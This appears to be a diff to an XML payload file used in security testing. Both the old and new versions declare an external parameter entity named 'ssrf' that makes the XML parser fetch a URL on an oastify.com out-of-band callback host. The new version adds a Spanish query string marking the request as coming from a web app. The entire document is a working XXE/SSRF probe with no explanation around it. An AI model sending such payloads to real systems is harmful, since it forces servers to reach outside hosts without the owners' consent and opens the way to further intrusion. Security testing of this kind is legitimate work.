@@ -1,1 +1,5 @@
-<!DOCTYPE x [<!ENTITY % ssrf SYSTEM "http://oh9w3rcxksnp53ta80d5p3nznqthha5z.oastify.com/">%ssrf;]>
+<!DOCTYPE test [
+<!ENTITY % ssrf SYSTEM "http://oh9w3rcxksnp53ta80d5p3nznqthha5z.oastify.com/?msg=peticion-SSRF-desde-webapp">
+%ssrf;
+]>
+<test>SSRF Test</test>
